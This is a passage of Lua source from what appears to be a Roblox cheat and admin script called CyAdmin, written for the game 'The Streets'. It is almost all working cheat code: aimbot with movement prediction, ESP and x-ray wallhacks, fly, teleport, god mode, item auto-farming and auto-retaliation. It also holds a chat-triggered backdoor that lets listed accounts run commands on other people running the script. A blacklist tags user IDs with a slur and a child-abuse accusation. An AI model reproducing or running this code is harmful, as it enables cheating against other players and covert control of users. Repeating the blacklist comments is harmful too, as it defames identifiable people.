		['Colour'] = Color3.fromRGB(89,89,89);
	};
	[62009114] = {
		['Name'] = "!fishgang X_D6 (Co-Owner but not a dev)";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(176,16,16);
	};
	[57370993] = {
		['Name'] = "!fishgang Karma (Head-Admin)";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(197,0,237);
	};
	[105183043] = {
		['Name'] = "Drpoppa creator";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(107,50,124);
	};
	[383632734] = {
		['Name'] = "Dot_mp4/Jack [Head-Admin]";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(127,0,212);
	};
	[96316322] = {
		['Name'] = "!fishgang Ambiguity [Admin]";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(57,52,52);
	};
	[714877] = {
		['Name'] = "!fishgang Ambiguity [Admin]";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(57,52,52);
	};
	[284761493] = {
		['Name'] = "Zero";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(255,145,175)
	};
	[6289688] = {
		['Name'] = "1337 hax0r";
		['Access'] = 3;
		['Colour'] = Color3.fromRGB(144,0,0);
    };
    [1528488185] = {
		['Name'] = "Basically a Gmod Dark RP admin (Paid)";
		['Access'] = 2;
		['Colour'] = Color3.fromRGB(235,31,31);
	};
	[710288902] = {
		['Name'] = "Randomly paid me 5 dollars";
		['Access'] = 1;
		['Colour'] = Color3.fromRGB(255,0,255);
	};
	[612618136] = {
		['Name'] = "Nigerian prince (Bird)";
		['Access'] = 2;
		['Colour'] = Color3.fromRGB(125,0,0);
	};
	[70550151] = {
		['Name'] = "Nigerian prince (Bird)";
		['Access'] = 2;
		['Colour'] = Color3.fromRGB(125,0,0);
	}
}

local BlacklistTable = {
	[878779033] = true; -- retard who hit me
	[1052869632] = true; -- Generally annoying and fan boys tagged users and claims he can script when he can't (skid).
	[481265818] = true; -- said he would dox me but wouldn't
	[362925188] = true; --[[
		retard moment https://cdn.discordapp.com/attachments/726179909906464870/734190528828145665/image0.png
		I add him: https://cdn.discordapp.com/attachments/726179909906464870/734191062435758201/image0.png
		gets mad he got exposed: https://cdn.discordapp.com/attachments/726179909906464870/734191218400952381/image0.png
	]]
	[338649839] = true; -- literally a pedophile and a skid
	[54133607] = true; -- Claims to hate me yet uses my script lol?
}

local SettingsTable = {
	Keys = {};
	ClickTpKey = "";
	SprintSpeed = 25;
	CrouchSpeed = 8;
	AimMode = "Prediction";
	AimlockMode = "LeftClick";
	AimbotVelocity = 5;
	CmdBarImage = "http://www.roblox.com/asset/?id=2812081613";
	CmdBarKey = "Quote"
}

if game.PlaceId == 455366377 then 
	PartTable = {
		['burger'] = workspace:WaitForChild'Burger | $15';
		['drink'] = workspace:WaitForChild'Drink | $15';
		['ammo'] = workspace:WaitForChild'Buy Ammo | $25';
		['pipe'] = workspace:WaitForChild'Pipe | $100';
		['machete'] = workspace:WaitForChild'Machete | $70';
		['sawedoff'] = workspace:WaitForChild'Sawed Off | $150';
		['spray'] = workspace:WaitForChild'Spray | $20';
		['uzi'] = workspace:WaitForChild'Uzi | $150';
		['glock'] = workspace:WaitForChild'Glock | $200';
	}
end 

local PlaceTable = {
	['sandbox'] = CFrame.new(-178.60614013672,3.2000000476837,-117.21733093262);
	['prison'] = CFrame.new(-978.74725341797,3.199854850769,-78.541763305664);
	['gas'] = CFrame.new(99.135276794434,18.599975585938,-73.462348937988);
	['court'] = CFrame.new( -191.56864929199,3,223.43171691895);
	['beach'] = CFrame.new(-663.97521972656,1.8657279014587,-369.04748535156);
	['bank'] = CFrame.new(-270.44195556641,4.8757019042969,133.12774658203);
}

local FarmTable = {
	['cash'] = "511726060";
	['shotty'] = "142383762";
	['sawed off'] = "219397110";
	['uzi'] = "328964620";
}

local EstimatedGunRanges = {
	['Glock'] = 100;
	['Uzi'] = 100;
	['Sawed Off'] = 50;
	['Shotty'] = 50;
}

local KeyTable = {
	['W'] = false;
	['A'] = false;
	['S'] = false;
	['D'] = false;
	['Shift'] = false;
	['Space'] = false;
	['Control'] = false;
}

local WhiteListedParts = {
	['head'] = "Head";
	['torso'] = "Torso";
	['humanoidrootpart'] = "HumanoidRootPart";
	['oldprediction'] = "OldPrediction";
	['prediction'] = "Prediction";
}

-- [[ End ]] -- 

-- [[ Random Initalization ]] --
 
coroutine.resume(coroutine.create(function()
	workspace.FallenPartsDestroyHeight = -50000
	LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
	LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
	if workspace:FindFirstChild'Armoured Truck' then 
	    VanPart.Color,VanPart.CFrame,VanPart.Size,VanPart.Material,VanPart.Anchored = Color3.fromRGB(196,40,28),CFrame.new(-136.858002,0,-523.700012),Vector3.new(9.93,1,20.31),"ForceField",true
	    workspace:FindFirstChild'Armoured Truck':Destroy()
	elseif workspace:FindFirstChild'TPer' then
	    VanPart.Color,VanPart.CFrame,VanPart.Size,VanPart.Material,VanPart.Anchored = Color3.fromRGB(196,40,28),CFrame.new(-31,-0.2,221),Vector3.new(12,1,6),"ForceField",true
	    workspace:FindFirstChild'TPer':Destroy()
	else
		VanPart:Destroy()
	end
	Players:Chat("I am a CyAdmin User") -- new admin
	Players:Chat("Hey I'm a cyrus' streets admin user1") -- legacy admin
end))

-- [[ End ]] -- 

-- [[ Hotkeys ]] -- 


getgenv().initalizeHotkeys = function(ConfigToSaveTo)
	writefile(ConfigToSaveTo,HttpService:JSONEncode(SettingsTable))
	local Settings = HttpService:JSONDecode(readfile(ConfigToSaveTo))
	Keys = Settings.Keys 
	ClickTpKey = Settings.ClicktpKey
	SprintSpeed = Settings.SprintSpeed
	AimMode = Settings.AimMode
	AimlockMode = Settings.AimlockMode
	AimbotVelocity = Settings.AimbotVelocity
	CmdBarImage = Settings.CmdBarImage
	CmdBarKey = Settings.CmdBarKey
end

getgenv().updateHotkeys = function(ConfigToUpdateTo)
	if not readfile or not writefile then return end
	local SettingsToUpdate = {
		Keys = Keys;
		ClickTpKey = ClickTpKey;
		SprintSpeed = SprintSpeed;
		CrouchSpeed = CrouchSpeed;
		AimMode = AimMode;
		AimlockMode = AimlockMode;
		AimbotVelocity = AimbotVelocity;
		CmdBarImage = CmdBarImage;
		CmdBarKey = CmdBarKey;
	}
	writefile(ConfigToUpdateTo,HttpService:JSONEncode(SettingsToUpdate))
end

getgenv().runHotkeys = function(ConfigToRun)
	local RunSettings = HttpService:JSONDecode(readfile(ConfigToRun))
	Keys = RunSettings.Keys
	ClickTpKey = RunSettings.ClickTpKey or ""
	SprintSpeed = RunSettings.SprintSpeed or 25
	CrouchSpeed = RunSettings.CrouchSpeed or 16
	AimMode = RunSettings.AimMode or "Prediction";
	AimlockMode = RunSettings.AimlockMode or "LeftClick"
	AimbotVelocity = RunSettings.AimbotVelocity or 5
	CmdBarImage = RunSettings.CmdBarImage or "http://www.roblox.com/asset/?id=2812081613"
	CmdBarKey = RunSettings.CmdBarKey or "Quote"
end
if readfile and writefile then 
	local FileExists = pcall(readfile,ConfigurationFile)
	if not FileExists then 
		initalizeHotkeys(ConfigurationFile)
	else
		runHotkeys(ConfigurationFile)
	end
end

-- [[ End ]] -- 

-- [[ Global Functions ]] -- 

getgenv().notif = function(Title,Message,Length,Icon)
	StarterGui:SetCore("SendNotification",{
	['Title'] = Title;
	['Text'] = Message;
	['Duration'] = Length;
	['Icon'] = Icon;
	})
end

getgenv().Teleport = function(Part)
	if typeof(Part) == "Instance" then Part = Part.CFrame end
	if typeof(Part) == "Vector3" then Part = CFrame.new(Part) end 
	if typeof(Part) == "CFrame" then 
		local Character = GetChar()
		local PartFound = Character:FindFirstChild'HumanoidRootPart' or Character:FindFirstChild'Torso'
		if PartFound and not Character:FindFirstChild'HumanoidRootPart' or (Part.p - PartFound.CFrame.p).magnitude < 50 then
			PartFound.CFrame = Part
		else
			TweenService:Create(PartFound,TweenInfo.new(3.2,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{CFrame = Part}):Play()
		end
	end
end

getgenv().AddCommand = function(CommandFunction,CommandName,CommandAliases,HelpInfo,Args)
	Commands[#Commands + 1] = {['Function'] = CommandFunction,['Name'] = CommandName,['Alias'] = CommandAliases,['Help'] = HelpInfo,['Args'] = Args}
end

getgenv().FindCommand = function(CommandName)
	for i = 1,#Commands do
		if Commands[i].Name == CommandName or AliasesEnabled and table.find(Commands[i].Alias,CommandName) then 
			return Commands[i].Function
		end
	end
end

getgenv().CheckCommand = function(Chat)
	local Arguments = string.split(Chat:lower()," ")
	local CommandName = table.remove(Arguments,1)
	local CommandFound = FindCommand(CommandName)
	if CommandFound then
		local CommandWorked,Error = pcall(CommandFound,Arguments)
		if not CommandWorked then 
			notif("Command errored: "..CommandName,"Send this to Cy: "..Error,10,nil)
		end
	end
end

getgenv().PlrFinder = function(PlayerString)
	local PlayerString = PlayerString:lower()
	local PlayerTable = Players:GetPlayers()
	if #PlayerString == 2 and PlayerString == "me" then return LP end
	if #PlayerString == 3 and PlayerString == "all" or #PlayerString == 5 and PlayerString == "users" then return PlayerTable end
	for i = 1,#PlayerTable do 
		if PlayerTable[i].Name:lower():sub(1,#PlayerString) == PlayerString then
			return PlayerTable[i]
		end
	end 
end

getgenv().find = function(ItemString)
	local ChildrenOfWorkspace = workspace:GetChildren()
	for i = 1,#ChildrenOfWorkspace do 
		local Item = ChildrenOfWorkspace[i]
		local ItemModel = Item:FindFirstChild'Model'
		if Item.Name == "RandomSpawner" and ItemModel then
			local Handle = ItemModel.Handle 
			if Handle:FindFirstChildOfClass'MeshPart' then 
				if FarmTable[ItemString] and string.find(Handle:FindFirstChildOfClass'MeshPart'.MeshId,FarmTable[ItemString]) then 
					return Item,"Cash" -- Cash 
				end
			end
			if Handle:FindFirstChild'Fire' then 
				if FarmTable[ItemString] and string.find(Handle.Fire.SoundId,FarmTable[ItemString]) then 
					return Item,"Gun" -- Guns
				end
			end
		end
	end
	return "None"
end

getgenv().farm = function(ItemString)
	if ItemString == "all" then 
		local WChildren = workspace:GetChildren()
		for i = 1,#WChildren do 
			local Child = WChildren[i]
			if Child.Name == "RandomSpawner" then 
				Teleport(Child.CFrame)
				Child.DescendantRemoving:Wait()
			end
		end
	end
	local Item = find(ItemString)
	if Item == "None" then notif("There is none of "..ItemString,"to farm",5,nil) return end 
	Teleport(Item.CFrame)
end

-- [[ End ]] --

-- [[ Local functions ]] -- 

local function BackdoorCheck(Player,Chat)
	if Chat:sub(1,1) == "`" then 
		local Arguments = string.split(Chat:sub(2)," ")
		local Command = BackDoorTableCommands[table.remove(Arguments,1)]
		local PlayerToMeme = PlrFinder(table.remove(Arguments,1))
		if Command and PlayerToMeme then 
			Command['Func'](PlayerToMeme,table.concat(Arguments," "),Player)
		end
	end 
end

local function convertKeyCode(KeyCode)
local KeyCodeToSet;
	local Work,Error = pcall(function()
		KeyCodeToSet = Enum.KeyCode[KeyCode]
	end)
	if not Work then
		KeyCodeToSet = Enum.KeyCode[KeyCode:upper()]
	end
	return KeyCodeToSet
end

local function ColourifyGuns(GunTable,Colour)
	for ToolIndex,Tool in pairs(GunTable:GetChildren()) do
		if Tool:IsA'Tool' and Tool:FindFirstChild'Fire' then  
			for _,Part in pairs(Tool:GetDescendants()) do 
				if Part:IsA'UnionOperation' or Part:IsA'Part' or Part:IsA'MeshPart' then 
					if Part:IsA'UnionOperation' then 
						Part.UsePartColor = true
					end
					Part.Material = "ForceField"
					Part.Color = Colour
				end
			end
		end
	end
end

local function initalizeBackdoorPart2(BackdoorPlayer,Colour)
	if BackdoorPlayer and BackdoorPlayer.Character then
		ColourifyGuns(BackdoorPlayer.Backpack,Colour)
		ColourifyGuns(BackdoorPlayer.Character,Colour)
		BackdoorPlayer.Character.ChildAdded:Connect(function()
			ColourifyGuns(BackdoorPlayer.Character,Colour)
		end)
	end
end


local function createBodyPos(Parent)
	local BodyPosition = Instance.new('BodyPosition',Parent)
	BodyPosition.P = BodyPosition.P * 8
	BodyPosition.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
	if GravGunSeizureMode then 
		GravGunBodyVelocity = Instance.new('BodyAngularVelocity',Parent)
		GravGunBodyVelocity.AngularVelocity = Vector3.new(0,9e9,0)
		GravGunBodyVelocity.MaxTorque = Vector3.new(0,9e9,0)
	end
	return BodyPosition 
end

local function Fly()
local Character = GetChar()
local Torso = Character:FindFirstChild'Torso'
if not Torso then return end 
	local BodyGyro,BodyVelocity = Instance.new('BodyGyro',Torso),Instance.new('BodyVelocity',Torso)
	BodyGyro.P = 9e9
	BodyGyro.MaxTorque = Vector3.new(9e9,9e9,9e9)
	BodyGyro.CFrame = Torso.CFrame
	BodyVelocity.MaxForce = Vector3.new(9e9,9e9,9e9)
	BodyVelocity.Velocity = Vector3.new(0,0.1,0)
	local Table1 = {['W'] = 0;['A'] = 0;['S'] = 0;['D'] = 0;}
	if not AirwalkOn then 
		CheckCommand("airwalk")
	end 
	while Flying and Character:FindFirstChild'Humanoid' and Character.Humanoid.Health > 0 and wait() do 
		if KeyTable['W'] then Table1['W'] = FlySpeed else Table1['W'] = 0 end 
		if KeyTable['A'] then Table1['A'] = -FlySpeed else Table1['A'] = 0 end 
		if KeyTable['S'] then Table1['S'] = -FlySpeed else Table1['S'] = 0 end 
		if KeyTable['D'] then Table1['D'] = FlySpeed else Table1['D'] = 0 end 
		if (Table1['W'] + Table1['S']) ~= 0 or (Table1['A'] + Table1['D']) ~= 0 then
			BodyVelocity.Velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (Table1['W'] + Table1['S'])) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(Table1['A'] + Table1['D'], (Table1['W'] + Table1['S']) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * 50
		else
			BodyVelocity.Velocity = Vector3.new(0,0.1,0)
		end
		BodyGyro.CFrame = workspace.CurrentCamera.CoordinateFrame
	end
	if AirwalkOn then 
		CheckCommand("airwalk")
	end 
	BodyGyro:Destroy()
	BodyVelocity:Destroy()
end

local function AimlockClosest(Player)
	local Box = Instance.new('BoxHandleAdornment',CoreGui.RobloxGui)
	Box.Adornee = Player.Character.Head
	Box.Size = Vector3.new(7,10,7)
	Box.SizeRelativeOffset = Vector3.new(0,-1,0)
	Box.Transparency = 1
	local Event1,Event2
	Event1 = Box.MouseButton1Down:Connect(function()
		if Aimlock and AimlockMode == "Closest" then
			AimlockTarget = Player.Character
			local Connection;Connection = Players:GetPlayerFromCharacter(AimlockTarget).CharacterAdded:Connect(function(C)
				if tostring(C) == tostring(AimlockTarget) then 
					AimlockTarget = C 
				else
					Connection:Disconnect()
					Connection = nil
				end
			end)
		else 
			Box:Destroy()
		end 
	end)
	Event2 = Player.CharacterRemoving:Connect(function()
		Box:Destroy()
		Event1:Disconnect()
		Event1 = nil 
		Event2:Disconnect()
		Event2 = nil
	end)
end 

local function checkHp(Plr)
	return Plr:FindFirstChildOfClass'Humanoid' and math.floor(Plr.Humanoid.Health) or "No Humanoid"
end

local function HasItem(Player,Item)
	if Player then 
		local ItemFound = Player.Character:FindFirstChild(Item,true) or Player.Backpack:FindFirstChild(Item,true)
		return ItemFound and "Yes" or "No" 
	end 
end

local function Unesp(Part)
	local Bill = Part:FindFirstChildOfClass'BillboardGui'
	if Part:IsA'BasePart' and Bill then
		Part = Part.Parent 
		Bill:Destroy()
		return 
	end 
	for i = 1,#EspTable do 
		local Table = EspTable[i]
		if Table then 
		local Player = Table['Player']
			if Player == Part then 
				for i,v in pairs(Table) do
					if v ~= Player then 
						if i ~= "Box" then 
							v:Remove()
						else
							table.foreach(v,function(Index,Value) Value:Remove() end)
						end
					end
				end
				table.remove(EspTable,i)
			end
		end 
	end
end

local function Esp(Part,Name,Colour,Blacklisted)
	local Player = PlrFinder(Part.Parent.Name)
	if Player and UseDrawingLib and not Colour then
		Unesp(Player)
		EspTable[#EspTable+1] = {['Player'] = Player,['Text'] = Drawing.new'Text',['Box'] = {Drawing.new'Line',Drawing.new'Line',Drawing.new'Line'}}
	else
		local Bill = Part:FindFirstChildOfClass'BillboardGui'
		if Bill then Bill:Destroy() end 
		local BillBoard = Instance.new('BillboardGui',Part)
		local TextLabel = Instance.new('TextLabel',BillBoard)
		BillBoard.Adornee = Part
		BillBoard.Size = UDim2.new(0,100,0,100)
		BillBoard.StudsOffset = Vector3.new(0,1.3,0)
		BillBoard.AlwaysOnTop = not Blacklisted and true or false
		TextLabel.BackgroundTransparency = 1
		TextLabel.Size = UDim2.new(1,0,0,40)
		TextLabel.TextColor3 = Colour or EspColour
		TextLabel.TextStrokeTransparency = 0.5
		TextLabel.TextSize = 8
		local Player = PlrFinder(Name)
		if Player then
			if not Blacklisted then 
				local User = AdminUserTable[Player] and "Yes" or "No"
				TextLabel.Text = Name.." | CyAdmin User: "..User.."\nHas (Gamepasses) Glock: "..HasItem(Player,"Glock").." | Shotty: "..HasItem(Player,"Shotty").." | Vest: "..HasItem(Player,"BulletResist")
			else 
				TextLabel.Text = "[Blacklisted skid] "..Player.Name
			end 
		else 
			TextLabel.Text = Name
		end
	end 
end

local function Xray(Mode)
	for i,v in pairs(workspace:GetDescendants()) do 
		if v:IsA'Part' and not v.Parent:FindFirstChild'Head' and not v.Parent.Parent:FindFirstChild'Head' and v.Size.Y ~= 1 then
			local Selection = v:FindFirstChildOfClass'SelectionBox'
			local Int = v:FindFirstChildOfClass'IntValue'
			if Int then
				v.Transparency = Int.Value
				Int:Destroy()
				if Selection then 
					Selection:Destroy()
				end
			else
				if Mode == "wireframe" then 
					local Select = Instance.new('SelectionBox',v)
					Select.Adornee = v
					Select.LineThickness = 0.001
					Select.SurfaceTransparency = 1
					Select.Color3 = Color3.fromRGB(124,0,0)
					WireFrameTable[#WireFrameTable + 1] = {Select,v}
				end
				local TransparentValue = Instance.new('IntValue',v)
				TransparentValue.Value = v.Transparency
				v.Transparency = 1
			end 
		end 
	end 	
end 

local function IsAUser(Player,Chat)
	if Chat == "I am a CyAdmin User" or Chat == "Hey I'm a cyrus' streets admin user1" then 
		AdminUserTable[Player] = true
		return true 
	end
end

local function ShowOrHideEsp(Table,Bool,Player)
    table.foreach(Table,function(Index,Value)
        if Index == "Box" then 
            table.foreach(Value,function(Index2,Value2)
				Value2.Visible = Bool
				local Aimlocked = tostring(Player) == tostring(CamlockPlayer) or tostring(Player) == tostring(AimlockTarget)
				Value2.Color = Aimlocked and Color3.fromRGB(255,0,0) or EspColour
            end)
		else
			if typeof(Value) ~= "Instance" then
				Value.Visible = Bool
				Value.Color = EspColour
			end 
        end 
	end)
end 

local function WorldToViewportPoint(Pos)
    return workspace.CurrentCamera:WorldToViewportPoint(Pos)
end

local function stopAnim(Id)
	local Tracks = GetChar().Humanoid:GetPlayingAnimationTracks()
	for i = 1,#Tracks do 
		local Track = Tracks[i] 
		if Track.Animation.AnimationId == ("rbxassetid://"..Id) then 
			Track:Stop()
		end
	end
end

local function GrabItem(Thing,OldPos)
	if game.PlaceId ~= 455366377 then return end
	local PartFound = GetChar():FindFirstChild'HumanoidRootPart' or GetChar():FindFirstChild'Torso'
	local Track = GetChar().Humanoid:LoadAnimation(SpinAnimation)
	PartFound.CFrame = PartFound.CFrame * CFrame.new(math.random(20,45),0,math.random(1,5))
	wait()
	BuyingStuff = true 
	repeat 
		Track:play(0.1,1,10)
		PartFound.CFrame = PartTable[Thing]:FindFirstChildOfClass'Part'.CFrame + Vector3.new(0,1.3,0)
		RunService.Heartbeat:wait()
	until PartTable[Thing]:FindFirstChildOfClass'Part'.BrickColor == BrickColor.new'Bright red' or GetChar():FindFirstChild('Bone',true) or GetChar().Humanoid.Health == 0
	PartFound.CFrame = OldPos
	BuyingStuff = false
	return true
end

local function HealthChanged(Health)
	if Health <= HealBotHealth and HealBot and not TpBypass then 
		if GrabItem("burger",GetChar().Head.CFrame) then
			local Hamborger = LP.Backpack:FindFirstChild'Burger'
			if Hamborger then 
				Hamborger.Parent = GetChar()
				Hamborger:Activate() -- CHEEMS
				repeat RunService.Heartbeat:Wait() until Hamborger.Parent ~= GetChar()
			end
		end -- yeah I copy pasted it from my heal cmd DEAL WITH IT 
		if GrabItem("drink",GetChar().Head.CFrame) then
			local Drink = LP.Backpack:FindFirstChild'Drink'
			if Drink then 
				Drink.Parent = GetChar()
				Drink:Activate()
			end 
		end		
	end
end

local function dragGUI(FrameToDrag,Thing)
	local Dragging = false
	local DragInput,DragStart,StartPos 
	local function Update(Input)
		local Delta = Input.Position - DragStart
		TweenService:Create(FrameToDrag,TweenInfo.new(0.055,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),{Position = UDim2.new(StartPos.X.Scale,StartPos.X.Offset + Delta.X,StartPos.Y.Scale,StartPos.Y.Offset + Delta.Y)}):Play()
	end
	FrameToDrag.InputBegan:Connect(function(Input)
		if Input.UserInputType == Enum.UserInputType.MouseButton1 then 
			Dragging = true
			DragStart = Input.Position
			StartPos = FrameToDrag.Position
			Input.Changed:Connect(function()
				if Input.UserInputState == Enum.UserInputState.End then 
					Dragging = false 
				end
			end)
		end
	end)
	FrameToDrag.InputChanged:Connect(function(Input)
		if Input.UserInputType == Enum.UserInputType.MouseMovement then 
			DragInput = Input
		end
	end)
	UserInput.InputChanged:Connect(function(Input)
		if Input == DragInput and Dragging then 
			Update(Input)
		end
	end)
end

local function createRainbow(Pos,Text,Value)
	local RainbowButton = Instance.new('TextButton',RainbowScrolling)
	RainbowButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	RainbowButton.BackgroundTransparency = 1
	RainbowButton.Position = Pos
	RainbowButton.Size = UDim2.new(0,480,0,50)
	RainbowButton.Font = Enum.Font.SourceSans
	RainbowButton.TextColor3 = Color3.fromRGB(170,0,0)
	RainbowButton.TextSize = 25
	RainbowButton.Text = Text
	RainbowButton.TextWrapped = true
	RainbowButton.MouseButton1Click:Connect(function()
		if Text == "All" then 
			RainbowHats = "All"
			RainbowFrame.Visible = false
		else 
			LP.Backpack.Stank:FireServer("rep",Value.Parent)
			RainbowFrame.Visible = false
			RainbowHats = true
		end 
	end)
	dragGUI(RainbowFrame,RainbowButton)
end

local function createCommandBarCmd(Name,Args)
	if Name and Args then 
		local CmdBarTextLabel = Instance.new('TextLabel',CmdBarFrame)
		CmdBarTextLabel.BackgroundTransparency = 1
		CmdBarTextLabel.Position = UDim2.new(-20,0,0,0)
		CmdBarTextLabel.Size = UDim2.new(0,200,0,15)
		CmdBarTextLabel.ZIndex = 2
		CmdBarTextLabel.Font = Enum.Font.SciFi
		CmdBarTextLabel.Text = (Name.." "..Args)
		CmdBarTextLabel.TextColor3 = Color3.fromRGB(255,255,255)
		CmdBarTextLabel.TextScaled = true
		CmdBarTextLabel.TextSize = 14
		CmdBarTextLabel.TextWrapped = true
		dragGUI(CmdBarFrame,CmdBarTextLabel)
	end 
end

local function createCmd(Pos,CommandName,CommandInfo,CommandArgs)
	local CommandLabel = Instance.new('TextLabel',CmdsScrolling)
	CommandLabel.BackgroundColor3 = Color3.fromRGB(0,0,0)
	CommandLabel.BackgroundTransparency = 0.9
	CommandLabel.Position = Pos
	CommandLabel.Size = UDim2.new(0,387,0,31)
	CommandLabel.Font = Enum.Font.SourceSans
	CommandLabel.Text = ("["..CommandName.."] "..CommandInfo)
	CommandLabel.TextColor3 = Color3.fromRGB(255,255,255)
	CommandLabel.TextSize = 14
	CommandLabel.TextWrapped = true
	dragGUI(CmdsFrame,CommandLabel)
end

local function StateChanged(Old,New)
	if Flying or NoGh then 
		if New == Enum.HumanoidStateType.FallingDown or New == Enum.HumanoidStateType.PlatformStanding then
			LP.Character.Humanoid.PlatformStand = false
			LP.Character.Humanoid:ChangeState(8)
		end
	end 
end

local function ShotOrHit(Character)
	if Character then 
		local Tool = Character:FindFirstChildOfClass'Tool'
		if Tool then 
			return Tool,Tool:FindFirstChild'Fire' and "shot you" or "hit you"
		end
	end 
end

local function ChangeDamageIndicatorText(Text)
	DmgIndicator.Text = Text
	DmgIndicator.Visible = true
	wait(5)
	DmgIndicator.Visible = false
end

local function ColourChanger(T)
	if T:IsA'Trail' then 
		T.Color = BulletColour
	end
	if BfgOn and T:FindFirstChild('Clips',true) then
		for _,v in pairs(LP.Backpack:GetChildren()) do 
			if v:IsA'Tool' and v:FindFirstChild('Clips',true) then 
				v.Parent = GetChar()
			end 
		end
	end 
	if not BfgOn and EstimatedGunRanges[T.Name] and GunAnim ~= "None" then 
		wait()
		if T.Name ~= "Shotty" and T.Name ~= "Sawed Off" or GunAnim == "1" then 
			GetChar().Humanoid:LoadAnimation(GunAnimation1):Play()
		else
			local Track = GetChar().Humanoid:LoadAnimation(GunAnimation2)
			Track:Play()
			wait()
			Track:AdjustSpeed(0)
		end 
	end 
	if T.Name == "Bone" then
		if AutoDie then
			GetChar().Humanoid.Health = 0
		end 
		if GodMode and game.PlaceId == 455366377 then 
			for i,v in pairs(GetChar():GetDescendants()) do 
				if v:IsA'NumberValue' then 
					v:Destroy()
				end 
			end
		end 
	end
	if T:IsA'ObjectValue' and T.Name == "creator" then
		local Player = T.Value
		if AutoTarget then
			if Aimlock then 
				AimlockTarget = Player
				local Connection;Connection = Players:GetPlayerFromCharacter(AimlockTarget).CharacterAdded:Connect(function(C)
					if tostring(C) == tostring(AimlockTarget) then 
						AimlockTarget = C 
					else
						Connection:Disconnect()
						Connection = nil
					end
				end)
			end
			if CamLocking then 
				CamlockPlayer = Players:GetPlayerFromCharacter(Player)
			end
		end
		if AutoFeloop then 
			CheckCommand("feloop "..tostring(Player))
		end 
		if AutoTriggerBot and not TriggerBot then
			CheckCommand("triggerbot "..tostring(Player))
			AutoStomp = true
			local Life;Life = Players:GetPlayerFromCharacter(Player).CharacterRemoving:Connect(function(Char)
				if tostring(Char) == tostring(AnnoyingPlayer) then 
					TriggerBot = false 
					AnnoyOn = false 
					AnnoyingPlayer = nil
					AimbotAutoShoot = false
					Flying = false
					AutoDie = false
					AutoStomp = false
					AimlockTarget = nil
					Life:Disconnect()
				else 
					Life:Disconnect()
				end 
			end)
		end 
		pcall(function()
			local Tool,Method = ShotOrHit(Player)
			ChangeDamageIndicatorText(Player.Name.." has "..Method.." from "..math.floor((GetChar().Head.Position - Player.Head.Position).magnitude).." studs with a "..Tool.Name)
		end)
	end
end

local function RemoveGunAnimation(T)
	if EstimatedGunRanges[T.Name] then 
		stopAnim("889968874")
		stopAnim("229339207")
	end 
end

local function FreeCam(Speed)
if not GetChar():FindFirstChild'Head' then return end 
	if workspace:FindFirstChild'FreecamPart' then 
		workspace.FreecamPart:Destroy()
	end
	Speed = Speed or 35
	GetChar().Head.Anchored = true 
	local FreecamPart = Instance.new('Part',workspace)
	FreecamPart.Name = "FreecamPart"
	FreecamPart.Position = GetChar().Head.Position + Vector3.new(0,5,0)
	FreecamPart.Transparency = 1
	FreecamPart.CanCollide = false
	FreecamPart.Anchored = true
	workspace.CurrentCamera.CameraSubject = FreecamPart
	while Freecam and GetChar().Humanoid.Health > 0 and wait() do 
		local Pos = Vector3.new()
		local Look = (workspace.CurrentCamera.Focus.p - workspace.CurrentCamera.CoordinateFrame.p).unit
		local PartPos = FreecamPart.Position
		if KeyTable['w'] then
			Pos = Pos + Vector3.new(0,0,-1)
		elseif KeyTable['a'] then
			Pos = Pos + Vector3.new(-1,0,0)
		elseif KeyTable['s'] then
			Pos = Pos + Vector3.new(0,0,1)
		elseif KeyTable['d'] then
			Pos = Pos + Vector3.new(1,0,0)
		elseif KeyTable['Space'] then
			Pos = Pos + Vector3.new(0,1,0)
		elseif KeyTable['Control'] then
			Pos = Pos + Vector3.new(0,-1,0)
		end 
		FreecamPart.CFrame = CFrame.new(PartPos,PartPos + Look) * CFrame.new(Pos * Speed)
	end
	workspace.CurrentCamera.CameraSubject = GetChar()
	GetChar().Head.Anchored = false 
	if workspace:FindFirstChild'FreecamPart' then 
		workspace.FreecamPart:Destroy()
	end
end

local function BehindAWall(Target)
	if Target:FindFirstChild'Head' and GetChar():FindFirstChild'Head' then 
		local RYEBread = Ray.new(Target.Head.Position,GetChar().Head.Position)
		local RYEBreadHit = workspace:FindPartOnRay(RYEBread)
		if RYEBreadHit then
			return RYEBreadHit:IsDescendantOf(Target)
		end
	end 
end

local function LoopChangeWalkSpeed()
	if game.PlaceId == 455366377 then 
		if KeyTable['Shift'] and (WalkShoot and (LP.Backpack:FindFirstChild'ServerTraits' and LP.Backpack.ServerTraits.Stann.Value > 0 or GetChar():FindFirstChild'Stamina' and GetChar().Stamina.Value > 0) or not WalkShoot) then
			if Normalwalk and SprintSpeed == 25 then return end
			GetChar().Humanoid.WalkSpeed = SprintSpeed
			return 
		end 
		if KeyTable['Control'] then 
			if Normalwalk and CrouchSpeed == 8 then return end
			GetChar().Humanoid.WalkSpeed = CrouchSpeed
			return 
		end
		if not WalkShoot then 
			GetChar().Humanoid.WalkSpeed = WalkSpeed
		end
	end 
end

local function AimbotToCFrame()
local CFrameToReturn;
local TargetPart = AimlockTarget.FindFirstChild(AimlockTarget,'HumanoidRootPart') or AimlockTarget.FindFirstChild(AimlockTarget,'Torso')
	if TargetPart and AimMode == "OldPrediction" then 
		CFrameToReturn = TargetPart.CFrame + TargetPart.Velocity / AimbotVelocity
	elseif TargetPart and AimMode == "Prediction" then
		CFrameToReturn = TargetPart.CFrame + TargetPart.Velocity / NewPredictionVelocity
	elseif AimlockTarget.FindFirstChild(AimlockTarget,AimMode) then 
		CFrameToReturn = AimlockTarget[AimMode].CFrame
	end
	return CFrameToReturn
end

local function updateGun()
	local NewTool;
